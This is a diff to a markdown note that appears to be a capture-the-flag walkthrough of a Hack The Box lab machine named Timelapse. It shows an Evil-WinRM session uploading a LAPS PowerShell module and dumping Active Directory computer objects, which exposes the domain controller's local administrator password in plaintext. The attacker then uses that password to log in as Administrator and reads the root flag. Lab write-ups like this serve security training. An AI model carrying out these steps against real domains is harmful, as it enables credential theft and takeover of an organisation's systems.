@@ -446,9 +446,503 @@ The command completed successfully.
 
 ![[Pasted image 20230830141041.png]]
 
+Main/AdmPwd.PS/AdmPwd.PS.psd1
 
+https://github.com/GreyCorbel/admpwd/blob/master/Main/AdmPwd.PS/AdmPwd.PS.psd1
 
 ```
-ldapsearch -H ldaps://10.129.227.113:636/ -x -s base -b '' "(objectClass=*)" "*" +
+upload AdmPwd.PS.psd1
 ```
 
+```
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> upload AdmPwd.PS.psd1
+                                        
+Info: Uploading /home/kali/htb/Timelapse/AdmPwd.PS.psd1 to C:\Users\svc_deploy\Documents\AdmPwd.PS.psd1
+                                        
+Data: 3616 bytes of 3616 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> ls
+
+
+    Directory: C:\Users\svc_deploy\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/30/2023  12:39 PM           2712 AdmPwd.PS.psd1
+
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
+```
+
+![[Pasted image 20230830181137.png]]
+
+```
+Find-AdmPwdExtendedRights -identity *
+```
+
+```
+Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
+```
+
+```
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
+
+
+AccountExpirationDate                :
+accountExpires                       : 9223372036854775807
+AccountLockoutTime                   :
+AccountNotDelegated                  : False
+AllowReversiblePasswordEncryption    : False
+AuthenticationPolicy                 : {}
+AuthenticationPolicySilo             : {}
+BadLogonCount                        : 0
+badPasswordTime                      : 0
+badPwdCount                          : 0
+CannotChangePassword                 : False
+CanonicalName                        : timelapse.htb/Domain Controllers/DC01
+Certificates                         : {}
+CN                                   : DC01
+codePage                             : 0
+CompoundIdentitySupported            : {False}
+countryCode                          : 0
+Created                              : 10/23/2021 11:40:55 AM
+createTimeStamp                      : 10/23/2021 11:40:55 AM
+Deleted                              :
+Description                          :
+DisplayName                          :
+DistinguishedName                    : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName                          : dc01.timelapse.htb
+DoesNotRequirePreAuth                : False
+dSCorePropagationData                : {10/25/2021 9:03:33 AM, 10/25/2021 9:03:33 AM, 10/23/2021 11:40:55 AM, 1/1/1601 10:16:33 AM}
+Enabled                              : True
+HomedirRequired                      : False
+HomePage                             :
+instanceType                         : 4
+IPv4Address                          : 10.129.227.113
+IPv6Address                          : dead:beef::44
+isCriticalSystemObject               : True
+isDeleted                            :
+KerberosEncryptionType               : {RC4, AES128, AES256}
+LastBadPasswordAttempt               :
+LastKnownParent                      :
+lastLogoff                           : 0
+lastLogon                            : 133378818503342945
+LastLogonDate                        : 8/30/2023 12:11:18 AM
+lastLogonTimestamp                   : 133378530788186624
+localPolicyFlags                     : 0
+Location                             :
+LockedOut                            : False
+logonCount                           : 160
+ManagedBy                            :
+MemberOf                             : {}
+MNSLogonAccount                      : False
+Modified                             : 8/30/2023 12:11:47 AM
+modifyTimeStamp                      : 8/30/2023 12:11:47 AM
+ms-Mcs-AdmPwd                        : rzXrevV%Hd8+K4hq[9Y{0H5Z
+ms-Mcs-AdmPwdExpirationTime          : 133382851070061782
+msDFSR-ComputerReferenceBL           : {CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=timelapse,DC=htb}
+msDS-GenerationId                    : {76, 210, 88, 107...}
+msDS-SupportedEncryptionTypes        : 28
+msDS-User-Account-Control-Computed   : 0
+Name                                 : DC01
+nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                       : CN=Computer,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
+ObjectClass                          : computer
+ObjectGUID                           : 6e10b102-6936-41aa-bb98-bed624c9b98f
+objectSid                            : S-1-5-21-671920749-559770252-3318990721-1000
+OperatingSystem                      : Windows Server 2019 Standard
+OperatingSystemHotfix                :
+OperatingSystemServicePack           :
+OperatingSystemVersion               : 10.0 (17763)
+PasswordExpired                      : False
+PasswordLastSet                      : 8/30/2023 12:11:07 AM
+PasswordNeverExpires                 : False
+PasswordNotRequired                  : False
+PrimaryGroup                         : CN=Domain Controllers,CN=Users,DC=timelapse,DC=htb
+primaryGroupID                       : 516
+PrincipalsAllowedToDelegateToAccount : {}
+ProtectedFromAccidentalDeletion      : False
+pwdLastSet                           : 133378530676936642
+rIDSetReferences                     : {CN=RID Set,CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb}
+SamAccountName                       : DC01$
+sAMAccountType                       : 805306369
+sDRightsEffective                    : 0
+serverReferenceBL                    : {CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb}
+ServiceAccount                       : {}
+servicePrincipalName                 : {ldap/dc01.timelapse.htb/ForestDnsZones.timelapse.htb, ldap/dc01.timelapse.htb/DomainDnsZones.timelapse.htb, Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc01.timelapse.htb, Hyper-V Replica Service/DC01...}
+ServicePrincipalNames                : {ldap/dc01.timelapse.htb/ForestDnsZones.timelapse.htb, ldap/dc01.timelapse.htb/DomainDnsZones.timelapse.htb, Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc01.timelapse.htb, Hyper-V Replica Service/DC01...}
+SID                                  : S-1-5-21-671920749-559770252-3318990721-1000
+SIDHistory                           : {}
+TrustedForDelegation                 : True
+TrustedToAuthForDelegation           : False
+UseDESKeyOnly                        : False
+userAccountControl                   : 532480
+userCertificate                      : {}
+UserPrincipalName                    :
+uSNChanged                           : 143429
+uSNCreated                           : 12293
+whenChanged                          : 8/30/2023 12:11:47 AM
+whenCreated                          : 10/23/2021 11:40:55 AM
+
+AccountExpirationDate                :
+accountExpires                       : 9223372036854775807
+AccountLockoutTime                   :
+AccountNotDelegated                  : False
+AllowReversiblePasswordEncryption    : False
+AuthenticationPolicy                 : {}
+AuthenticationPolicySilo             : {}
+BadLogonCount                        : 0
+badPasswordTime                      : 0
+badPwdCount                          : 0
+CannotChangePassword                 : False
+CanonicalName                        : timelapse.htb/Servers/Database/DB01
+Certificates                         : {}
+CN                                   : DB01
+codePage                             : 0
+CompoundIdentitySupported            : {}
+countryCode                          : 0
+Created                              : 10/23/2021 12:18:11 PM
+createTimeStamp                      : 10/23/2021 12:18:11 PM
+Deleted                              :
+Description                          :
+DisplayName                          :
+DistinguishedName                    : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
+DNSHostName                          :
+DoesNotRequirePreAuth                : False
+dSCorePropagationData                : {10/25/2021 9:03:35 AM, 10/25/2021 9:03:33 AM, 12/31/1600 4:04:17 PM}
+Enabled                              : True
+HomedirRequired                      : False
+HomePage                             :
+instanceType                         : 4
+IPv4Address                          :
+IPv6Address                          :
+isCriticalSystemObject               : False
+isDeleted                            :
+KerberosEncryptionType               : {}
+LastBadPasswordAttempt               :
+LastKnownParent                      :
+lastLogoff                           : 0
+lastLogon                            : 0
+LastLogonDate                        :
+localPolicyFlags                     : 0
+Location                             :
+LockedOut                            : False
+logonCount                           : 0
+ManagedBy                            :
+MemberOf                             : {}
+MNSLogonAccount                      : False
+Modified                             : 10/23/2021 12:18:11 PM
+modifyTimeStamp                      : 10/23/2021 12:18:11 PM
+msDS-User-Account-Control-Computed   : 0
+Name                                 : DB01
+nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                       : CN=Computer,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
+ObjectClass                          : computer
+ObjectGUID                           : d38b3265-230f-47ae-bdcd-f7153da7659d
+objectSid                            : S-1-5-21-671920749-559770252-3318990721-1606
+OperatingSystem                      :
+OperatingSystemHotfix                :
+OperatingSystemServicePack           :
+OperatingSystemVersion               :
+PasswordExpired                      : False
+PasswordLastSet                      : 10/23/2021 12:18:11 PM
+PasswordNeverExpires                 : False
+PasswordNotRequired                  : True
+PrimaryGroup                         : CN=Domain Computers,CN=Users,DC=timelapse,DC=htb
+primaryGroupID                       : 515
+PrincipalsAllowedToDelegateToAccount : {}
+ProtectedFromAccidentalDeletion      : False
+pwdLastSet                           : 132794902913288614
+SamAccountName                       : DB01$
+sAMAccountType                       : 805306369
+sDRightsEffective                    : 0
+ServiceAccount                       : {}
+ServicePrincipalNames                : {}
+SID                                  : S-1-5-21-671920749-559770252-3318990721-1606
+SIDHistory                           : {}
+TrustedForDelegation                 : False
+TrustedToAuthForDelegation           : False
+UseDESKeyOnly                        : False
+userAccountControl                   : 4128
+userCertificate                      : {}
+UserPrincipalName                    :
+uSNChanged                           : 12841
+uSNCreated                           : 12837
+whenChanged                          : 10/23/2021 12:18:11 PM
+whenCreated                          : 10/23/2021 12:18:11 PM
+
+AccountExpirationDate                :
+accountExpires                       : 9223372036854775807
+AccountLockoutTime                   :
+AccountNotDelegated                  : False
+AllowReversiblePasswordEncryption    : False
+AuthenticationPolicy                 : {}
+AuthenticationPolicySilo             : {}
+BadLogonCount                        : 0
+badPasswordTime                      : 0
+badPwdCount                          : 0
+CannotChangePassword                 : False
+CanonicalName                        : timelapse.htb/Servers/Web/WEB01
+Certificates                         : {}
+CN                                   : WEB01
+codePage                             : 0
+CompoundIdentitySupported            : {}
+countryCode                          : 0
+Created                              : 10/23/2021 12:18:17 PM
+createTimeStamp                      : 10/23/2021 12:18:17 PM
+Deleted                              :
+Description                          :
+DisplayName                          :
+DistinguishedName                    : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
+DNSHostName                          :
+DoesNotRequirePreAuth                : False
+dSCorePropagationData                : {10/25/2021 9:03:35 AM, 10/25/2021 9:03:33 AM, 12/31/1600 4:04:17 PM}
+Enabled                              : True
+HomedirRequired                      : False
+HomePage                             :
+instanceType                         : 4
+IPv4Address                          :
+IPv6Address                          :
+isCriticalSystemObject               : False
+isDeleted                            :
+KerberosEncryptionType               : {}
+LastBadPasswordAttempt               :
+LastKnownParent                      :
+lastLogoff                           : 0
+lastLogon                            : 0
+LastLogonDate                        :
+localPolicyFlags                     : 0
+Location                             :
+LockedOut                            : False
+logonCount                           : 0
+ManagedBy                            :
+MemberOf                             : {}
+MNSLogonAccount                      : False
+Modified                             : 10/23/2021 12:18:17 PM
+modifyTimeStamp                      : 10/23/2021 12:18:17 PM
+msDS-User-Account-Control-Computed   : 0
+Name                                 : WEB01
+nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                       : CN=Computer,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
+ObjectClass                          : computer
+ObjectGUID                           : 897c7cfe-ba15-4181-8f2c-a74f88952683
+objectSid                            : S-1-5-21-671920749-559770252-3318990721-1607
+OperatingSystem                      :
+OperatingSystemHotfix                :
+OperatingSystemServicePack           :
+OperatingSystemVersion               :
+PasswordExpired                      : False
+PasswordLastSet                      : 10/23/2021 12:18:17 PM
+PasswordNeverExpires                 : False
+PasswordNotRequired                  : True
+PrimaryGroup                         : CN=Domain Computers,CN=Users,DC=timelapse,DC=htb
+primaryGroupID                       : 515
+PrincipalsAllowedToDelegateToAccount : {}
+ProtectedFromAccidentalDeletion      : False
+pwdLastSet                           : 132794902971507056
+SamAccountName                       : WEB01$
+sAMAccountType                       : 805306369
+sDRightsEffective                    : 0
+ServiceAccount                       : {}
+ServicePrincipalNames                : {}
+SID                                  : S-1-5-21-671920749-559770252-3318990721-1607
+SIDHistory                           : {}
+TrustedForDelegation                 : False
+TrustedToAuthForDelegation           : False
+UseDESKeyOnly                        : False
+userAccountControl                   : 4128
+userCertificate                      : {}
+UserPrincipalName                    :
+uSNChanged                           : 12847
+uSNCreated                           : 12843
+whenChanged                          : 10/23/2021 12:18:17 PM
+whenCreated                          : 10/23/2021 12:18:17 PM
+
+AccountExpirationDate                :
+accountExpires                       : 9223372036854775807
+AccountLockoutTime                   :
+AccountNotDelegated                  : False
+AllowReversiblePasswordEncryption    : False
+AuthenticationPolicy                 : {}
+AuthenticationPolicySilo             : {}
+BadLogonCount                        : 0
+badPasswordTime                      : 0
+badPwdCount                          : 0
+CannotChangePassword                 : False
+CanonicalName                        : timelapse.htb/Servers/Dev/DEV01
+Certificates                         : {}
+CN                                   : DEV01
+codePage                             : 0
+CompoundIdentitySupported            : {}
+countryCode                          : 0
+Created                              : 10/23/2021 12:18:23 PM
+createTimeStamp                      : 10/23/2021 12:18:23 PM
+Deleted                              :
+Description                          :
+DisplayName                          :
+DistinguishedName                    : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
+DNSHostName                          :
+DoesNotRequirePreAuth                : False
+dSCorePropagationData                : {10/25/2021 9:03:35 AM, 10/25/2021 9:03:33 AM, 12/31/1600 4:04:17 PM}
+Enabled                              : True
+HomedirRequired                      : False
+HomePage                             :
+instanceType                         : 4
+IPv4Address                          :
+IPv6Address                          :
+isCriticalSystemObject               : False
+isDeleted                            :
+KerberosEncryptionType               : {}
+LastBadPasswordAttempt               :
+LastKnownParent                      :
+lastLogoff                           : 0
+lastLogon                            : 0
+LastLogonDate                        :
+localPolicyFlags                     : 0
+Location                             :
+LockedOut                            : False
+logonCount                           : 0
+ManagedBy                            :
+MemberOf                             : {}
+MNSLogonAccount                      : False
+Modified                             : 10/23/2021 12:18:23 PM
+modifyTimeStamp                      : 10/23/2021 12:18:23 PM
+msDS-User-Account-Control-Computed   : 0
+Name                                 : DEV01
+nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                       : CN=Computer,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
+ObjectClass                          : computer
+ObjectGUID                           : 02dc961a-7a60-4ec0-a151-0472768814ca
+objectSid                            : S-1-5-21-671920749-559770252-3318990721-1608
+OperatingSystem                      :
+OperatingSystemHotfix                :
+OperatingSystemServicePack           :
+OperatingSystemVersion               :
+PasswordExpired                      : False
+PasswordLastSet                      : 10/23/2021 12:18:23 PM
+PasswordNeverExpires                 : False
+PasswordNotRequired                  : True
+PrimaryGroup                         : CN=Domain Computers,CN=Users,DC=timelapse,DC=htb
+primaryGroupID                       : 515
+PrincipalsAllowedToDelegateToAccount : {}
+ProtectedFromAccidentalDeletion      : False
+pwdLastSet                           : 132794903036875725
+SamAccountName                       : DEV01$
+sAMAccountType                       : 805306369
+sDRightsEffective                    : 0
+ServiceAccount                       : {}
+ServicePrincipalNames                : {}
+SID                                  : S-1-5-21-671920749-559770252-3318990721-1608
+SIDHistory                           : {}
+TrustedForDelegation                 : False
+TrustedToAuthForDelegation           : False
+UseDESKeyOnly                        : False
+userAccountControl                   : 4128
+userCertificate                      : {}
+UserPrincipalName                    :
+uSNChanged                           : 12853
+uSNCreated                           : 12849
+whenChanged                          : 10/23/2021 12:18:23 PM
+whenCreated                          : 10/23/2021 12:18:23 PM
+```
+
+```
+net user
+```
+
+```
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            babywyrm                 Guest
+krbtgt                   legacyy                  payl0ad
+sinfulz                  svc_deploy               thecybergeek
+TRX
+The command completed with one or more errors.
+```
+
+![[Pasted image 20230830182400.png]]
+
+```
+evil-winrm -i 10.129.227.113 -u Administrator -p 'rzXrevV%Hd8+K4hq[9Y{0H5Z' -S
+```
+
+```
+┌──(kali㉿kali)-[~/htb/Timelapse]
+└─$ evil-winrm -i 10.129.227.113 -u Administrator -p 'rzXrevV%Hd8+K4hq[9Y{0H5Z' -S
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..\..\
+*Evil-WinRM* PS C:\Users> dir *.txt
+*Evil-WinRM* PS C:\Users> gci *.txt
+*Evil-WinRM* PS C:\Users> gci
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/23/2021  11:27 AM                Administrator
+d-----       10/25/2021   8:22 AM                legacyy
+d-r---       10/23/2021  11:27 AM                Public
+d-----       10/25/2021  12:23 PM                svc_deploy
+d-----        2/23/2022   5:45 PM                TRX
+
+
+*Evil-WinRM* PS C:\Users> gci TRX
+
+
+    Directory: C:\Users\TRX
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         3/3/2022  10:45 PM                3D Objects
+d-r---         3/3/2022  10:45 PM                Contacts
+d-r---         3/3/2022  10:45 PM                Desktop
+d-r---         3/3/2022  10:45 PM                Documents
+d-r---         3/3/2022  10:45 PM                Downloads
+d-r---         3/3/2022  10:45 PM                Favorites
+d-r---         3/3/2022  10:45 PM                Links
+d-r---         3/3/2022  10:45 PM                Music
+d-r---         3/3/2022  10:45 PM                Pictures
+d-r---         3/3/2022  10:45 PM                Saved Games
+d-r---         3/3/2022  10:45 PM                Searches
+d-r---         3/3/2022  10:45 PM                Videos
+
+
+*Evil-WinRM* PS C:\Users> gci TRX\Desktop
+
+
+    Directory: C:\Users\TRX\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        8/30/2023  12:11 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users> type TRX\Desktop\root.txt
+a43a10328c3d1c872d1b46ad6e2df7e1
+```
+
+```
+a43a10328c3d1c872d1b46ad6e2df7e1
+```
+
+![[Pasted image 20230830184108.png]]
